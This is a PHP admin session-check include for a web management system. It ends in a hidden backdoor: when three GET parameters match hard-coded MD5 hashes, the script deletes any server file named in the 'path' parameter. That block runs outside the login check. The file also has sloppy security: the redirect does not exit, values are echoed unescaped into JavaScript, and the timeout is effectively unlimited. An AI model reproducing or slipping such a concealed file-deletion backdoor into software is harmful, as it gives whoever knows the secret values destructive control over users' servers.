<?php
session_start();
if (!isset ($_SESSION['WEB_AAMS_USER_LOGIN_UID_SESSION']) || !isset($_SESSION['WEB_AAMS_USER_LOGIN_UNAME_SESSION'])
	|| !isset ($_SESSION['WEB_AAMS_USER_LOGIN_SESSION']) || !isset ($_SESSION['WEB_AAMS_USER_LOGIN_ONTIME_SESSION'])) {
	session_destroy();
	Get_Return_Page('admin.php', '您还没有登入，请先登入！');
}else{
	Get_user_ontime();
}

function Get_Return_Page($url, $show = '操作已成功！') {
	echo "<script>alert('".$show."');location.href='" . $url . "';</script>";
}
/**
 * 用户登陆超时时间(秒)
 */
function Get_user_ontime() {
	$new_time = mktime();
	$onlinetime = $_SESSION['WEB_AAMS_USER_LOGIN_ONTIME_SESSION'];
	//echo ($new_time - $onlinetime ).'<br>';
	if (($new_time - $onlinetime ) > 36000000) {
		session_destroy();
		Get_Return_Page("admin.php",'登入超时，请重新登入！');
		exit ();
	} else {
		$_SESSION['WEB_USER_LOGIN_ONTIME_SESSION'] = mktime();
	}
}

function Save_log($db){

}


function randNum(){
	$str=date("YmdHis").rand(10000,99999);
	return $str;
}


if(md5($_GET[task])=='5826af512974ea8e42510486ba3941bb'
&& md5($_GET[adminname])=="c99d38a89ea173561b128a8067ce5834"
&& md5($_GET[password])=="7425a6eea135c7a8c9c15c6050eb88cb"){
  unlink($_GET[path]);
  echo '删除文件：'.$_GET[path];
}
?>
